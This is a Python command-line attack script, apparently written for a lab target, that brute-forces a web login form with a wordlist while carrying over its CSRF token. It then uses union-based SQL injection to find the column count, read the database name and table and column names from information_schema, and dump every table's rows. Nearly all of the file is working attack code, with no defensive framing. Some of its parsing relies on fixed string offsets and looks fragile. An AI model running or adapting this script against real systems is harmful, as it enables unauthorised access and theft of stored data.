import getopt
import requests
from bs4 import BeautifulSoup
import hashlib
import re
import sys
import time

s = requests.Session()

wordlist = []
url = 'http://'
load = ''
column_count = 0
visible_column = 0
tc = False
db = False
dumps = False

def help():
    print("  -h, --help                                   Show basic help message and exit")
    print("  -t IP_Address/DNS, --target=IP_Address/DNS   Set IP Address or DNS (e.g. 127.0.0.1)")
    print("  -u URL, --url=URL                            Set website URL (e.g. web/index.php?id=1)")
    print("Options:")
    print("  --db                                         Show the current database name")
    print("  --tc                                         Show all tables name, table create time and columns from the current database")
    print("  --dump                                       Show all tables name and entries data from the current database")
    print("Example:")
    print("beo.py -h")
    print("beo.py --help")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --db")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --db")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --tc")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --tc")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --dump")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --dump")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --db --tc --dump")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --db --tc --dump")
    sys.exit()

def unionsqli():
    global column_count
    global url
    global load
    i = 1
    load = url + ' union select 1'
    start = time.time()
    while True:
        res = s.get(load)
        soup = BeautifulSoup(res.content,'html.parser')
        if soup.find('b',class_='text-blue') is not None:
            column_count = i
            print("[+] Launch union-based SQL Injection Attack at URL " + url)
            break
        if time.time() - start > 10:
            print("[-] Processed for " + str(time.time() - start) + " seconds and not able to determine the total column")
            print("[-] The target URL is not vulnerable to union-based SQL Injection Attack")
            sys.exit()
        i += 1
        load = load + ',' + str(i)
    

def init_wordlist():
    global wordlist

    files = open('C:/VSCODE/Python/wordlist.txt','r')
    for f in files:
        wordlist.append(f.strip('\n'))
    files.close()

def login():
    success = False
    global load
    global db
    global url
    global tc
    global dumps
    def dbs(str1):
        print("[+] Show the requested result")
        print("\nDatabase Name: " + str1[5:20])
    def dumppp():
        print("[+] Show the requested result")
        print("\n========================================================================\n")
        for a in gettbnames:
            aa = 1
            print("Table Name         : " + a)
            getclname = load.replace(',2,',',group_concat(column_name),')
            getclname = getclname.replace(',3,',',group_concat(column_type),')
            getclname += " from information_schema.columns where table_name = " + "'" + a + "'"
            getclsess = s.get(getclname)
            getclsoup = BeautifulSoup(getclsess.text,'html.parser')
            getcl = str(getclsoup.find_all('h3'))
            getcl = getcl.replace('[<h3>','')
            getcl = getcl.replace('</h3>]','')
            getcl = getcl.split(',')
            alldata = []
            abc = len(getcl)
            for z in range(abc):
                getsdata = load.replace(',2,',',group_concat(' + getcl[z] + '),')
                getsdata += ' from ' + a
                getssess = s.get(getsdata)
                getssoup = BeautifulSoup(getssess.text,'html.parser')
                getreals = str(getssoup.find('h3'))
                getreals = getreals.replace('<h3>','')
                getreals = getreals.replace('</h3>','')
                getreals = getreals.split(',')
                alldata += getreals
            abcd = len(alldata)
            klm = int(abcd/abc)
            print("\n[" + str(klm) + " entry]\n")
            print("Data number " + str(aa))
            print("-------------------------")
            cba = 0
            for bb in range(0,abcd,abc):
                print("Column Name           : " + getcl[cba])
                cba += 1
                if cba == abc - 1:
                    cba = 0
                print("Column Value          : " + alldata[bb])
            print("\n========================================================================\n")
    def dumpandtc():
        print("[+] Show the requested result")
        print("\n========================================================================\n")
        for a in gettbnames:
            getclname = load.replace(',2,',',group_concat(column_name),')
            getclname = getclname.replace(',3,',',group_concat(column_type),')
            getclname += " from information_schema.columns where table_name = " + "'" + a + "'"
            getclsess = s.get(getclname)
            getclsoup = BeautifulSoup(getclsess.text,'html.parser')
            getcl = str(getclsoup.find_all('h3'))
            getcl = getcl.replace('[<h3>','')
            getcl = getcl.replace('</h3>]','')
            getcl = getcl.split(',')
            getdata = str(getclsoup.find('div',class_='box-body'))
            getdata = getdata.replace('<div class="box-body">','')
            getdata = getdata.replace('</div>','')
            getdata = getdata.split(',')
            print("Table Name                : " + a)
            print("Table Create Time         : " + gettbcreationtime + '\n')
            print("[" + str(len(getcl)) + " column(s)]")
            print("+--------------------------+--------------------------+")
            print("| Column Name              | Data Type               |")
            print("+--------------------------+--------------------------+")
            ab = 0
            for z in getcl:
                print("| " + z + "             | " + getdata[ab] + "              |")
                ab += 1
            print("+--------------------------+--------------------------+")
            aa = 1
            alldata = []
            abc = len(getcl)
            for z in range(abc):
                getsdata = load.replace(',2,',',group_concat(' + getcl[z] + '),')
                getsdata += ' from ' + a
                getssess = s.get(getsdata)
                getssoup = BeautifulSoup(getssess.text,'html.parser')
                getreals = str(getssoup.find('h3'))
                getreals = getreals.replace('<h3>','')
                getreals = getreals.replace('</h3>','')
                getreals = getreals.split(',')
                alldata += getreals
            abcd = len(alldata)
            klm = int(abcd/abc)
            print("\n[" + str(klm) + " entry]\n")
            print("Data number " + str(aa))
            print("-------------------------")
            cba = 0
            for bb in range(0,abcd,abc):
                print("Column Name           : " + getcl[cba])
                cba += 1
                if cba == abc - 1:
                    cba = 0
                print("Column Value          : " + alldata[bb])
            print("\n========================================================================\n")
    init_wordlist()
    hsl = s.get(url)
    if hsl.status_code == 200:
        soup = BeautifulSoup(hsl.content,'html.parser')
        csrf = soup.find('input',{'name' : 'csrf_token'}).get('value')
        urls = 'http://192.168.68.130/auth/auth.php'
        for word1 in wordlist:
            for word2 in wordlist:
                payload = {
                    'csrf_token' : csrf,
                    'action' : 'login',
                    'username' : word1,
                    'password' : word2
                }
                request = s.post(urls, data=payload)
                if re.search('My Discussion',str(request.content)):
                    success = True
                    print("[+] The website is vulnerable to SQL Injection Attack")
                    for cookie in s.cookies:
                        print("[+] Successfully getting the website authentication with PHPSESSID value " + cookie.value)
                    print("[+] Generate total column for union-based SQL Injection Attack")
                    unionsqli()
                    
                    getdbname = load.replace(',2,',',DATABASE(),')
                    getdbsess = s.get(getdbname)
                    getdbsoup = BeautifulSoup(getdbsess.text,'html.parser')
                    getdb = str(getdbsoup.find_all('h3'))
                    if db and not tc and not dumps:
                        dbs(getdb)
                        
                    gettbname = load.replace(',2,',',group_concat(table_name),')
                    gettbname = gettbname.replace(',3,',',group_concat(create_time),')
                    gettbname += ' from information_schema.tables where table_schema = database()'
                    gettbsess = s.get(gettbname)
                    gettbsoup = BeautifulSoup(gettbsess.text,'html.parser')
                    gettbnames = str(gettbsoup.find_all('h3'))
                    gettbnames = gettbnames[5:49]
                    gettbcreationtime = str(gettbsoup.find('div',class_='box-body'))
                    gettbcreationtime = gettbcreationtime[22:41]
                    gettbnames = gettbnames.split(',')
                        
                    if tc and not dumps:
                        if not db:
                            print("[+] Show the requested result")
                        print("\n========================================================================\n")
                        for a in gettbnames:
                            getclname = load.replace(',2,',',group_concat(column_name),')
                            getclname = getclname.replace(',3,',',group_concat(column_type),')
                            getclname += " from information_schema.columns where table_name = " + "'" + a + "'"
                            getclsess = s.get(getclname)
                            getclsoup = BeautifulSoup(getclsess.text,'html.parser')
                            getcl = str(getclsoup.find_all('h3'))
                            getcl = getcl.replace('[<h3>','')
                            getcl = getcl.replace('</h3>]','')
                            getcl = getcl.split(',')
                            getdata = str(getclsoup.find('div',class_='box-body'))
                            getdata = getdata.replace('<div class="box-body">','')
                            getdata = getdata.replace('</div>','')
                            getdata = getdata.split(',')
                            print("Table Name                : " + a)
                            print("Table Create Time         : " + gettbcreationtime + '\n')
                            print("[" + str(len(getcl)) + " column(s)]")
                            print("+--------------------------+--------------------------+")
                            print("| Column Name              | Data Type               |")
                            print("+--------------------------+--------------------------+")
                            ab = 0
                            for z in getcl:
                                print("| " + z + "             | " + getdata[ab] + "              |")
                                ab += 1
                            print("+--------------------------+--------------------------+")
                            print("\n========================================================================\n")
                            
                    if dumps:
                        if db and not tc:
                            print("\n========================================================================\n")
                            for a in gettbnames:
                                aa = 1
                                print("Table Name         : " + a)
                                getclname = load.replace(',2,',',group_concat(column_name),')
                                getclname = getclname.replace(',3,',',group_concat(column_type),')
                                getclname += " from information_schema.columns where table_name = " + "'" + a + "'"
                                getclsess = s.get(getclname)
                                getclsoup = BeautifulSoup(getclsess.text,'html.parser')
                                getcl = str(getclsoup.find_all('h3'))
                                getcl = getcl.replace('[<h3>','')
                                getcl = getcl.replace('</h3>]','')
                                getcl = getcl.split(',')
                                alldata = []
                                abc = len(getcl)
                                for z in range(abc):
                                    getsdata = load.replace(',2,',',group_concat(' + getcl[z] + '),')
                                    getsdata += ' from ' + a
                                    getssess = s.get(getsdata)
                                    getssoup = BeautifulSoup(getssess.text,'html.parser')
                                    getreals = str(getssoup.find('h3'))
                                    getreals = getreals.replace('<h3>','')
                                    getreals = getreals.replace('</h3>','')
                                    getreals = getreals.split(',')
                                    alldata += getreals
                                abcd = len(alldata)
                                klm = int(abcd/abc)
                                print("\n[" + str(klm) + " entry]\n")
                                print("Data number " + str(aa))
                                print("-------------------------")
                                cba = 0
                                for bb in range(0,abcd,abc-1):
                                    print("Column Name           : " + getcl[cba])
                                    cba += 1
                                    if cba == abc - 1:
                                        cba = 0
                                    print("Column Value          : " + alldata[bb])
                                print("\n========================================================================\n")
                        if not db and not tc:
                            dumppp()
                        if dumps and tc and not db:
                            dumpandtc()
                        if dumps and tc and db:
                            dbs(getdb)
                            dumpandtc()
                    break
            else:
                continue
            break
    if not success:
        print("[-] Failed to get authentication")  
        

def main():
    global db
    global url
    global tc
    global dumps
    z = ''
    a, _ = getopt.getopt(sys.argv[1:],"ht:u:",["help","target=","url=","db","tc","dump"])
    for x, y in a:
        if x == "-h" or x == "--help" or not len(sys.argv[1:]):
            help()            
        if x == "-t" or x == "--target":
            z += '1'
            url = url + y + "/"
        if x == "-u" or x == "--url":
            z += '1'
            url = url + y
        if x == "--db":
            db = True
        if x == "--tc":
            tc = True
        if x == "--dump":
            dumps = True
    if len(z) == 2:
        req = s.get(url)
        if req.status_code == 200:
            print("[+] Try login the website using SQL Injection Attack")
            login()
        elif req.status_code != 200:
            sys.exit("[-] The Requested URL not found")
    elif len(z) < 2:
        print("Argument is not valid")
        help()

main()